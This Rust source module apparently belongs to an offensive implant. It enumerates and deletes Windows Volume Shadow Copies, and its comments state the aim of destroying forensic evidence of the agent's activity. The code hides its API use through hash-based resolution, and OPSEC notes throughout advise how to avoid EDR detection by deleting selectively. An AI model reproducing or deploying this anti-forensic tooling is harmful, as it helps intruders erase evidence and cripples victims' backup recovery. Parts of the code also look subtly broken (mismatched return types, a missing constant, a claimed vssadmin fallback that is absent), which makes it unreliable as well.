// ── Volume Shadow Copy Management ─────────────────────────────────────
//
// Enumerates and deletes Volume Shadow Copies (VSS snapshots) to
// destroy forensic evidence that may contain pre-modification file
// states, deleted files, or backup copies of sensitive artifacts.
//
// VSS snapshots are created by:
//   - Windows Backup
//   - System Restore Points
//   - VSS writers (Exchange, SQL, etc.)
//   - Manual creation (vssadmin create shadow)
//
// Forensic value of VSS:
//   - File versions from before the agent's activity
//   - Deleted file recovery (MFT entries in snapshots)
//   - Registry hive snapshots (SAM, SYSTEM, SOFTWARE)
//   - NTFS metadata ($MFT, $LogFile) from before modification
//
// Deletion methods:
//   1. WMI COM: Win32_ShadowCopy enumeration + DeleteInstance — primary
//   2. WMI COM: ExecMethod("Delete_") — alternative
//
// OPSEC WARNING:
//   Deleting ALL shadow copies is a high-visibility action commonly
//   associated with ransomware.  Many EDR products flag this behavior.
//   Prefer selective deletion (by ID or keeping the N newest).
//
// All WMI operations use COM with hash-based dynamic API resolution — no
// IAT entries are created for any DLL.  No child processes are spawned
// (no powershell.exe, no vssadmin.exe).
// Windows-only, gated by `forensic-cleanup` feature flag.

use std::ffi::c_void;
use std::mem;
use std::ptr;

use anyhow::{anyhow, bail, Result};
use serde::{Deserialize, Serialize};
use tracing::{debug, info, warn};

use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};

// ── Compile-time API hash constants ─────────────────────────────────────────

// ole32.dll — COM initialization and instance creation
const HASH_OLE32_DLL: u32 = hash_wstr_const(&[
    'o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16,
    'l' as u16, 0,
]);
const FN_CO_INITIALIZE_EX: u32 = hash_str_const(b"CoInitializeEx");
const FN_CO_UNINITIALIZE: u32 = hash_str_const(b"CoUninitialize");
const FN_CO_CREATE_INSTANCE: u32 = hash_str_const(b"CoCreateInstance");
const FN_CO_SET_PROXY_BLANKET: u32 = hash_str_const(b"CoSetProxyBlanket");

// oleaut32.dll — VARIANT and BSTR operations
const HASH_OLEAUT32_DLL: u32 = hash_wstr_const(&[
    'o' as u16, 'l' as u16, 'e' as u16, 'a' as u16, 'u' as u16, 't' as u16, '3' as u16, '2' as u16,
    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
]);
const FN_SYS_ALLOC_STRING: u32 = hash_str_const(b"SysAllocString");
const FN_SYS_FREE_STRING: u32 = hash_str_const(b"SysFreeString");
const FN_VARIANT_INIT: u32 = hash_str_const(b"VariantInit");
const FN_VARIANT_CLEAR: u32 = hash_str_const(b"VariantClear");

// ── Windows type imports ────────────────────────────────────────────────────

use crate::win_types::DWORD;
use crate::win_types::HRESULT;
use crate::win_types::{CLSID, IID};
use windows_sys::Win32::System::Com::COINIT_MULTITHREADED;
use windows_sys::Win32::System::Com::EOLE_AUTHENTICATION_CAPABILITIES;
use windows_sys::Win32::System::Com::{CLSCTX_INPROC_SERVER, CLSCTX_LOCAL_SERVER};
use windows_sys::Win32::System::Com::{
    RPC_C_AUTHN_LEVEL_CALL, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, RPC_C_IMP_LEVEL_IMPERSONATE,
};
use windows_sys::Win32::System::Wmi::IID_IWbemServices;
use windows_sys::Win32::System::Wmi::{
    CLSID_WbemLocator, IEnumWbemClassObject, IID_IWbemLocator, IWbemClassObject, IWbemLocator,
    IWbemServices, WBEM_FLAG_FORWARD_ONLY, WBEM_FLAG_RETURN_IMMEDIATELY, WBEM_INFINITE,
};
// ── COM helper types ────────────────────────────────────────────────────────

/// BSTR type alias (pointer to wide string with length prefix).
type BSTR = *mut u16;

/// VARIANT type for WMI property passing.
#[repr(C)]
#[derive(Copy, Clone)]
struct VARIANT {
    vt: u16,
    w_reserved1: u16,
    w_reserved2: u16,
    w_reserved3: u16,
    data: VARIANT_DATA,
}

#[repr(C)]
#[derive(Copy, Clone)]
union VARIANT_DATA {
    bstr_val: BSTR,
    i4_val: i32,
    bool_val: i16,
    ptr_val: *mut c_void,
    uint8_val: u8,
}

const VT_BSTR: u16 = 8;
const VT_I4: u16 = 3;
const VT_EMPTY: u16 = 0;
const VT_NULL: u16 = 1;

/// Helper: check if an HRESULT indicates success.
fn hr_ok(hr: HRESULT) -> bool {
    hr >= 0
}

/// Wide-string pointer type (matches winapi's LPCWSTR).
type LPCWSTR = *const u16;

/// RAII guard that calls `CoUninitialize` on drop.
struct CoUninitializeGuard;

impl Drop for CoUninitializeGuard {
    fn drop(&mut self) {
        unsafe {
            let ole32 = match pe_resolve::get_module_handle_by_hash(HASH_OLE32_DLL) {
                Some(b) => b,
                None => return,
            };
            let co_uninit = match pe_resolve::get_proc_address_by_hash(ole32, FN_CO_UNINITIALIZE) {
                Some(a) => a,
                None => return,
            };
            let co_uninit: unsafe extern "system" fn() = mem::transmute(co_uninit);
            co_uninit();
        }
    }
}

// ── Dynamic API resolution helpers ──────────────────────────────────────────

/// Resolves an ole32.dll export by hash and transmutes to the requested type.
unsafe fn resolve_ole32<T>(fn_hash: u32) -> Option<T> {
    let base = pe_resolve::get_module_handle_by_hash(HASH_OLE32_DLL)?;
    let addr = pe_resolve::get_proc_address_by_hash(base, fn_hash)?;
    Some(mem::transmute::<usize, T>(addr))
}

/// Resolves an oleaut32.dll export by hash and transmutes to the requested type.
unsafe fn resolve_oleaut32<T>(fn_hash: u32) -> Option<T> {
    let base = pe_resolve::get_module_handle_by_hash(HASH_OLEAUT32_DLL)?;
    let addr = pe_resolve::get_proc_address_by_hash(base, fn_hash)?;
    Some(mem::transmute::<usize, T>(addr))
}

/// Allocates a BSTR from a Rust string.  Returns a null pointer on failure.
unsafe fn alloc_bstr(s: &str) -> BSTR {
    let sys_alloc: unsafe extern "system" fn(*const u16) -> BSTR =
        resolve_oleaut32(FN_SYS_ALLOC_STRING).expect("SysAllocString not found");
    let wide: Vec<u16> = s.encode_utf16().chain(std::iter::once(0u16)).collect();
    sys_alloc(wide.as_ptr())
}

/// Frees a BSTR.  No-op if the pointer is null.
unsafe fn free_bstr(b: BSTR) {
    if b.is_null() {
        return;
    }
    let sys_free: unsafe extern "system" fn(BSTR) =
        resolve_oleaut32(FN_SYS_FREE_STRING).expect("SysFreeString not found");
    sys_free(b);
}

/// Initializes a VARIANT to VT_EMPTY.
unsafe fn variant_init(v: *mut VARIANT) {
    let vi: unsafe extern "system" fn(*mut VARIANT) =
        resolve_oleaut32(FN_VARIANT_INIT).expect("VariantInit not found");
    vi(v);
}

/// Clears a VARIANT (releases contents).
unsafe fn variant_clear(v: *mut VARIANT) {
    let vc: unsafe extern "system" fn(*mut VARIANT) -> HRESULT =
        resolve_oleaut32(FN_VARIANT_CLEAR).expect("VariantClear not found");
    vc(v);
}

// ── WMI connection ──────────────────────────────────────────────────────────

/// Connects to the WMI `ROOT\cimv2` namespace (where `Win32_ShadowCopy` lives).
///
/// Performs the full COM initialization sequence via hash-based resolution:
/// 1. `CoInitializeEx(NULL, COINIT_MULTITHREADED)`
/// 2. `CoCreateInstance(CLSID_WbemLocator, …, IID_IWbemLocator)`
/// 3. `locator.ConnectServer("ROOT\\cimv2", …)`
/// 4. `CoSetProxyBlanket(services, …)`
///
/// Returns `(guard, services)` on success.  The guard calls `CoUninitialize`
/// on drop.
unsafe fn wmi_connect_cimv2() -> Result<(CoUninitializeGuard, *mut IWbemServices)> {
    // Step 1 — CoInitializeEx
    let co_init: unsafe extern "system" fn(*mut c_void, DWORD) -> HRESULT =
        resolve_ole32(FN_CO_INITIALIZE_EX)
            .ok_or_else(|| anyhow!("cannot resolve CoInitializeEx"))?;
    let hr = co_init(ptr::null_mut(), COINIT_MULTITHREADED);
    // S_FALSE (0x00000001) means already initialized on this thread — that is OK.
    if hr < 0 && hr != 0x00000001_i32 as HRESULT {
        bail!("CoInitializeEx failed: {hr:#010x}");
    }
    let guard = CoUninitializeGuard;

    // Step 2 — CoCreateInstance(CLSID_WbemLocator)
    let co_create: unsafe extern "system" fn(
        *const CLSID,
        *mut c_void,
        DWORD,
        *const IID,
        *mut *mut c_void,
    ) -> HRESULT = resolve_ole32(FN_CO_CREATE_INSTANCE)
        .ok_or_else(|| anyhow!("cannot resolve CoCreateInstance"))?;

    let mut locator: *mut IWbemLocator = ptr::null_mut();
    let hr = co_create(
        &CLSID_WbemLocator,
        ptr::null_mut(),
        CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER,
        &IID_IWbemLocator,
        &mut locator as *mut *mut IWbemLocator as *mut *mut c_void,
    );
    if !hr_ok(hr) {
        bail!("CoCreateInstance(CLSID_WbemLocator) failed: {hr:#010x}");
    }

    // Step 3 — locator.ConnectServer("ROOT\\cimv2", ...)
    let namespace_bstr = alloc_bstr("ROOT\\cimv2");
    let mut services: *mut IWbemServices = ptr::null_mut();
    let hr = (*(*locator).lpVtbl).ConnectServer(
        locator,
        namespace_bstr,
        ptr::null_mut(), // strUser
        ptr::null_mut(), // strPassword
        ptr::null_mut(), // strLocale
        0,               // lSecurityFlags
        ptr::null_mut(), // strAuthority
        ptr::null_mut(), // pCtx
        &mut services,
    );
    free_bstr(namespace_bstr);

    // Release the locator — we no longer need it.
    (*(*locator).lpVtbl).Release(locator);

    if !hr_ok(hr) {
        bail!("ConnectServer(ROOT\\cimv2) failed: {hr:#010x}");
    }

    // Step 4 — CoSetProxyBlanket
    let co_blanket: unsafe extern "system" fn(
        *mut c_void,
        DWORD,
        DWORD,
        *mut c_void,
        DWORD,
        DWORD,
        *mut c_void,
        DWORD,
    ) -> HRESULT = resolve_ole32(FN_CO_SET_PROXY_BLANKET)
        .ok_or_else(|| anyhow!("cannot resolve CoSetProxyBlanket"))?;

    let hr = co_blanket(
        services as *mut c_void,
        RPC_C_AUTHN_WINNT,           // dwAuthnSvc
        RPC_C_AUTHZ_NONE,            // dwAuthzSvc
        ptr::null_mut(),             // pServerPrincName
        RPC_C_AUTHN_LEVEL_CALL,      // dwAuthnLevel
        RPC_C_IMP_LEVEL_IMPERSONATE, // dwImpersonationLevel
        ptr::null_mut(),             // pAuthInfo
        EOAC_NONE as DWORD,          // dwCapabilities
    );
    if !hr_ok(hr) {
        (*(*services).lpVtbl).Release(services);
        bail!("CoSetProxyBlanket failed: {hr:#010x}");
    }

    Ok((guard, services))
}

/// Reads a BSTR property from a WMI object and converts it to a `String`.
/// Returns `None` if the property is null, empty, or not a BSTR.
unsafe fn get_bstr_property(obj: *mut IWbemClassObject, prop_name: &str) -> Option<String> {
    let name_bstr = alloc_bstr(prop_name);
    let mut val: VARIANT = mem::zeroed();
    variant_init(&mut val);
    (*(*obj).lpVtbl).Get(
        obj,
        name_bstr,
        0,
        &mut val,
        ptr::null_mut(),
        ptr::null_mut(),
    );
    free_bstr(name_bstr);

    let result = if val.vt == VT_BSTR && !val.data.bstr_val.is_null() {
        let bstr = val.data.bstr_val;
        let len = (0..).take_while(|&i| *bstr.add(i) != 0).count();
        let slice = std::slice::from_raw_parts(bstr, len);
        String::from_utf16_lossy(slice)
    } else {
        None
    };

    variant_clear(&mut val);
    result
}

/// Reads a u64 property from a WMI object (stored as VT_BSTR string).
/// Returns 0 if the property is missing or cannot be parsed.
unsafe fn get_u64_property(obj: *mut IWbemClassObject, prop_name: &str) -> u64 {
    get_bstr_property(obj, prop_name)
        .and_then(|s| s.parse::<u64>().ok())
        .unwrap_or(0)
}

// ═══════════════════════════════════════════════════════════════════════════
// Data Types
// ═══════════════════════════════════════════════════════════════════════════

/// Metadata for a single Volume Shadow Copy.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShadowCopyInfo {
    /// Shadow copy unique ID (GUID format).
    pub id: String,
    /// Shadow copy set ID (GUID format).
    pub set_id: String,
    /// Source volume device name (e.g. `\\?\Volume{guid}\`).
    pub volume_name: String,
    /// VSS device object path (e.g. `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`).
    pub device_object: String,
    /// Originating machine name.
    pub origin_machine: String,
    /// Service that created the snapshot (e.g. "SWPRV", "VSS").
    pub service: String,
    /// Creation time as a WMI datetime string (e.g. "20260512120000.000000+000").
    pub install_date: String,
    /// Number of bytes used by the snapshot (approximate).
    pub used_bytes: u64,
}

/// Result of a shadow copy deletion operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeletionResult {
    /// Number of shadow copies deleted.
    pub deleted_count: usize,
    /// IDs of deleted shadow copies.
    pub deleted_ids: Vec<String>,
    /// Number of shadow copies that could not be deleted.
    pub failed_count: usize,
    /// IDs of shadow copies that failed to delete.
    pub failed_ids: Vec<String>,
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: Enumeration
// ═══════════════════════════════════════════════════════════════════════════

/// Enumerate all Volume Shadow Copies on the system.
///
/// Uses WMI COM to query `Win32_ShadowCopy` class directly — no child
/// processes are spawned.  All COM and OLE32/OLEAUT32 APIs are resolved
/// at runtime via PE export-table hashing so no IAT entries are created.
///
/// # Returns
/// Vector of shadow copy metadata, sorted by creation time (newest first).
pub fn enumerate_shadow_copies() -> Result<Vec<ShadowCopyInfo>> {
    enumerate_via_wmi()
}

/// Enumerate shadow copies via WMI COM (IWbemServices::ExecQuery).
///
/// Connects to `ROOT\cimv2` and executes
/// `SELECT * FROM Win32_ShadowCopy` using the COM-based WMI API.
/// Iterates the resulting `IEnumWbemClassObject` enumerator and reads
/// each property via `IWbemClassObject::Get`.
fn enumerate_via_wmi() -> Result<Vec<ShadowCopyInfo>> {
    unsafe {
        let (_guard, services) = wmi_connect_cimv2()?;

        let wql_lang = alloc_bstr("WQL");
        let query = alloc_bstr("SELECT * FROM Win32_ShadowCopy");

        let mut enumerator: *mut IEnumWbemClassObject = ptr::null_mut();
        let hr = (*(*services).lpVtbl).ExecQuery(
            services,
            wql_lang,
            query,
            WBEM_FLAG_FORWARD_ONLY as i32 | WBEM_FLAG_RETURN_IMMEDIATELY as i32,
            ptr::null_mut(),
            &mut enumerator,
        );
        free_bstr(query);
        free_bstr(wql_lang);

        if !hr_ok(hr) {
            (*(*services).lpVtbl).Release(services);
            bail!("IWbemServices::ExecQuery(SELECT * FROM Win32_ShadowCopy) failed: {hr:#010x}");
        }

        let mut copies = Vec::new();

        loop {
            let mut obj: *mut IWbemClassObject = ptr::null_mut();
            let mut returned: u32 = 0;
            let hr = (*(*enumerator).lpVtbl).Next(
                enumerator,
                WBEM_INFINITE as i32,
                1,
                &mut obj,
                &mut returned,
            );
            if !hr_ok(hr) || returned == 0 {
                break;
            }

            let id = get_bstr_property(obj, "ID").unwrap_or_default();
            let set_id = get_bstr_property(obj, "SetID").unwrap_or_default();
            let volume_name = get_bstr_property(obj, "VolumeName").unwrap_or_default();
            let device_object = get_bstr_property(obj, "DeviceObject").unwrap_or_default();
            let origin_machine = get_bstr_property(obj, "OriginatingMachine").unwrap_or_default();
            let service_machine = get_bstr_property(obj, "ServiceMachine").unwrap_or_default();
            let install_date = get_bstr_property(obj, "InstallDate").unwrap_or_default();
            let used_bytes = get_u64_property(obj, "UsedBytes");

            (*(*obj).lpVtbl).Release(obj);

            copies.push(ShadowCopyInfo {
                id,
                set_id,
                volume_name,
                device_object,
                origin_machine,
                service: service_machine,
                install_date,
                used_bytes,
            });
        }

        (*(*enumerator).lpVtbl).Release(enumerator);
        (*(*services).lpVtbl).Release(services);

        // Sort by creation time, newest first.
        copies.sort_by(|a, b| b.install_date.cmp(&a.install_date));

        debug!("Enumerated {} shadow copies via WMI COM", copies.len());
        Ok(copies)
    }
}

/// Parse vssadmin output into ShadowCopyInfo structs.
fn parse_vssadmin_output(output: &str) -> Result<Vec<ShadowCopyInfo>> {
    let mut copies = Vec::new();
    let mut current = ShadowCopyInfoBuilder::default();

    for line in output.lines() {
        let line = line.trim();

        if line.starts_with("Shadow Copy ID:") {
            if let Some(built) = current.build() {
                copies.push(built);
            }
            current = ShadowCopyInfoBuilder::default();
            current.id = line
                .trim_start_matches("Shadow Copy ID:")
                .trim()
                .to_string();
        } else if line.starts_with("Shadow Copy Set ID:") {
            current.set_id = line
                .trim_start_matches("Shadow Copy Set ID:")
                .trim()
                .to_string();
        } else if line.starts_with("Volume Name:") {
            current.volume_name = line.trim_start_matches("Volume Name:").trim().to_string();
        } else if line.starts_with("Originating Machine:") {
            current.origin_machine = line
                .trim_start_matches("Originating Machine:")
                .trim()
                .to_string();
        } else if line.starts_with("Service Machine:") {
            current.service = line
                .trim_start_matches("Service Machine:")
                .trim()
                .to_string();
        } else if line.starts_with("Installed:") {
            current.install_date = line.trim_start_matches("Installed:").trim().to_string();
        } else if line.contains("HarddiskVolumeShadowCopy") {
            // Extract device object from lines like:
            // "Shadow copies on volume \\?\Volume{guid}\:"
            // or the device path itself.
            if line.starts_with("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy")
                || line.starts_with("\\\\?\\GLOBALROOT")
            {
                current.device_object = line.to_string();
            }
        }
    }

    // Don't forget the last entry.
    if let Some(built) = current.build() {
        copies.push(built);
    }

    copies.sort_by(|a, b| b.install_date.cmp(&a.install_date));
    Ok(copies)
}

#[derive(Default)]
struct ShadowCopyInfoBuilder {
    id: String,
    set_id: String,
    volume_name: String,
    device_object: String,
    origin_machine: String,
    service: String,
    install_date: String,
}

impl ShadowCopyInfoBuilder {
    fn build(self) -> Option<ShadowCopyInfo> {
        if self.id.is_empty() {
            return None;
        }
        Some(ShadowCopyInfo {
            id: self.id,
            set_id: self.set_id,
            volume_name: self.volume_name,
            device_object: self.device_object,
            origin_machine: self.origin_machine,
            service: self.service,
            install_date: self.install_date,
            used_bytes: 0, // Not available from vssadmin.
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: Deletion
// ═══════════════════════════════════════════════════════════════════════════

/// Delete all Volume Shadow Copies, optionally keeping the N newest.
///
/// # OPSEC WARNING
/// Deleting all shadow copies is a high-visibility action commonly
/// associated with ransomware.  Many EDR products flag this behavior.
/// Consider using `delete_shadow_copy_by_id()` for targeted deletion.
///
/// # Arguments
/// * `keep_newest` — Number of newest snapshots to preserve.  0 = delete all.
///
/// # Returns
/// A DeletionResult with details of what was deleted.
pub fn delete_shadow_copies(keep_newest: u32) -> Result<DeletionResult> {
    let copies = enumerate_shadow_copies()?;

    if copies.is_empty() {
        info!("No shadow copies found to delete");
        return Ok(DeletionResult {
            deleted_count: 0,
            deleted_ids: Vec::new(),
            failed_count: 0,
            failed_ids: Vec::new(),
        });
    }

    // copies are sorted newest-first; skip the first `keep_newest`.
    let to_delete: Vec<&ShadowCopyInfo> = if keep_newest > 0 {
        copies.iter().skip(keep_newest as usize).collect()
    } else {
        copies.iter().collect()
    };

    info!(
        "Deleting {} shadow copies (keeping {} newest of {} total)",
        to_delete.len(),
        keep_newest,
        copies.len()
    );

    let mut result = DeletionResult {
        deleted_count: 0,
        deleted_ids: Vec::new(),
        failed_count: 0,
        failed_ids: Vec::new(),
    };

    for copy in to_delete {
        match delete_single_shadow_copy(&copy.id) {
            Ok(()) => {
                result.deleted_count += 1;
                result.deleted_ids.push(copy.id.clone());
                debug!("Deleted shadow copy: {}", copy.id);
            }
            Err(e) => {
                result.failed_count += 1;
                result.failed_ids.push(copy.id.clone());
                warn!("Failed to delete shadow copy {}: {}", copy.id, e);
            }
        }
    }

    info!(
        "Shadow copy deletion complete: {} deleted, {} failed",
        result.deleted_count, result.failed_count
    );

    Ok(result)
}

/// Delete a specific shadow copy by its GUID.
///
/// More targeted than deleting all shadow copies — less suspicious to
/// monitoring tools.  Uses WMI first, falls back to vssadmin.
///
/// # Arguments
/// * `id` — Shadow copy GUID (as returned by enumerate_shadow_copies).
pub fn delete_shadow_copy_by_id(id: &str) -> Result<()> {
    if id.is_empty() {
        bail!("Shadow copy ID cannot be empty");
    }
    delete_single_shadow_copy(id)
}

/// Delete a single shadow copy using WMI COM.
///
/// Uses `IWbemServices::DeleteInstance` with a WMI object path constructed
/// from the shadow copy ID.  No string interpolation into a PowerShell command
/// — the ID is passed as a COM BSTR, eliminating the command-injection vector.
fn delete_single_shadow_copy(id: &str) -> Result<()> {
    unsafe {
        let (_guard, services) = wmi_connect_cimv2()?;

        // Build the WMI object path: Win32_ShadowCopy.ID="<guid>"
        let object_path = format!("Win32_ShadowCopy.ID=\"{}\"", id);
        let path_bstr = alloc_bstr(&object_path);

        let hr = (*(*services).lpVtbl).DeleteInstance(
            services,
            path_bstr,
            0,               // lFlags
            ptr::null_mut(), // pCtx
            ptr::null_mut(), // ppCallResult
        );
        free_bstr(path_bstr);
        (*(*services).lpVtbl).Release(services);

        if hr_ok(hr) {
            info!("Deleted shadow copy {} via WMI COM DeleteInstance", id);
            Ok(())
        } else {
            bail!(
                "WMI DeleteInstance failed for shadow copy {}: {hr:#010x}",
                id
            )
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Unit Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shadow_copy_info_serialization() {
        let info = ShadowCopyInfo {
            id: "{ABC12345-DEFG-HIJK-LMNO-PQRSTUV}".to_string(),
            set_id: "{SET12345}".to_string(),
            volume_name: r"\\?\Volume{guid}\".to_string(),
            device_object: r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1".to_string(),
            origin_machine: "WORKSTATION".to_string(),
            service: "SWPRV".to_string(),
            install_date: "20260512120000.000000+000".to_string(),
            used_bytes: 1024,
        };
        let json = serde_json::to_string(&info).unwrap();
        let decoded: ShadowCopyInfo = serde_json::from_str(&json).unwrap();
        assert_eq!(decoded.id, info.id);
        assert_eq!(decoded.used_bytes, 1024);
    }

    #[test]
    fn test_deletion_result_serialization() {
        let result = DeletionResult {
            deleted_count: 2,
            deleted_ids: vec!["id1".to_string(), "id2".to_string()],
            failed_count: 0,
            failed_ids: Vec::new(),
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("deleted_count"));
        assert!(json.contains("id1"));
    }

    #[test]
    fn test_parse_vssadmin_empty() {
        let result = parse_vssadmin_output("").unwrap();
        assert!(result.is_empty());
    }

    #[test]
    fn test_parse_vssadmin_single_entry() {
        let output = r#"Contents of shadow copy set ID: {set-1234}
   Contained 1 shadow copies at creation time: 05/12/2026 12:00:00 PM
      Shadow Copy ID: {abc-defg-hijk}
         Shadow Copy Set ID: {set-1234}
         Volume Name: \\?\Volume{vol-guid}\
         Originating Machine: WORKSTATION
         Service Machine: WORKSTATION
         Installed: 05/12/2026 12:00:00 PM
"#;
        let result = parse_vssadmin_output(output).unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].id, "{abc-defg-hijk}");
        assert_eq!(result[0].set_id, "{set-1234}");
        assert_eq!(result[0].origin_machine, "WORKSTATION");
    }

    #[test]
    fn test_parse_vssadmin_multiple_entries() {
        let output = r#"Shadow Copy ID: {id-1}
         Set ID: {set-1}
         Volume Name: \\?\Volume{vol-1}\
         Originating Machine: SERVER1
Shadow Copy ID: {id-2}
         Set ID: {set-2}
         Volume Name: \\?\Volume{vol-2}\
         Originating Machine: SERVER2
"#;
        let result = parse_vssadmin_output(output).unwrap();
        assert_eq!(result.len(), 2);
        assert_eq!(result[0].origin_machine, "SERVER2"); // Newest first (alphabetical sort)
        assert_eq!(result[1].origin_machine, "SERVER1");
    }

    #[test]
    fn test_shadow_copy_builder_empty() {
        let builder = ShadowCopyInfoBuilder::default();
        assert!(builder.build().is_none());
    }

    #[test]
    fn test_shadow_copy_builder_with_id() {
        let mut builder = ShadowCopyInfoBuilder::default();
        builder.id = "{test-id}".to_string();
        builder.volume_name = r"\\?\Volume{v}".to_string();
        let info = builder.build().unwrap();
        assert_eq!(info.id, "{test-id}");
    }
}
